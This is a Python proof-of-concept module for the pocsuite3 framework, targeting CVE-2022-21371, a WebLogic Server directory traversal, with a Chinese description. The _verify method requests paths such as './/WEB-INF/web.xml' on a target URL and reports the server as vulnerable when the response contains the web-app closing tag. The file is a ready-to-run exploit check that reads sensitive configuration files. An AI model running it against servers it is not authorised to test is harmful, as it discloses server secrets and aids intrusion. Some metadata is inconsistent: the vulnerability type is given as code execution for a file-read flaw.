from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
class DemoPOC(POCBase):
    vulID = 'CVE-2022-21371'  # ssvid
    version = '1.0'
    name = 'WebLogic Server 目录遍历漏洞'
    appName = 'Weblogic'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''在 CVE-2022- 21371 中，攻击者可利用该漏洞读取Weblogic Server 中的敏感信息，例如web.xml等。Oracle官方已发布安全更新以修复该漏洞。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    def _verify(self):#验证模式
        result = {}
        path = {
            './/META-INF/MANIFEST.MF',
            './/WEB-INF/web.xml',
            './/WEB-INF/portlet.xml',
            './/WEB-INF/weblogic.xml'
        }
        try:
            for i in path :
                target = self.url+i
                print(target)
                r = requests.get(url=target,timeout=8,verify=False)
                if "</web-app>" in r.text:
                    result['verifyInfo'] = {}
                    result['verifyInfo']['URL'] = target
                    return self.parse_output(result)
                else:
                    continue
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)